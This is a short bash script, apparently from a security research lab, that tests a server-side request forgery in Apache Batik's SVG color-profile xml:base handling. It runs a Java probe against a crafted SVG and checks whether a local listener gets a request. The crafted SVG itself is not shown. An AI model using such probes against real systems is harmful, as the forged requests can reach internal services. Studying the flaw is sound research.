#!/usr/bin/env bash
# P1 amplifier: does the color-profile xml:base SSRF work with NULL document URL (raw SVG string, no URI)?
set -uo pipefail
W=/tmp/batik-lab; cd "$W"
CP=$(printf '%s' "$W/batik-1.19/lib/*")
python3 srv9999.py > /tmp/batik-lab/p1null.result 2>&1 &
SRV=$!; sleep 1.2
echo "=== BatikProbe with docURI=- (NULL doc URL, raw string input) ==="
timeout 40 java -cp "$CP:." BatikProbe /tmp/batik-lab/cp.svg - false 2>&1 | grep -E "TRANSCODE|Exception" | head -4
sleep 3
echo "=== P1-null result ==="; cat /tmp/batik-lab/p1null.result 2>/dev/null | tail -3
kill $SRV 2>/dev/null; echo DONE
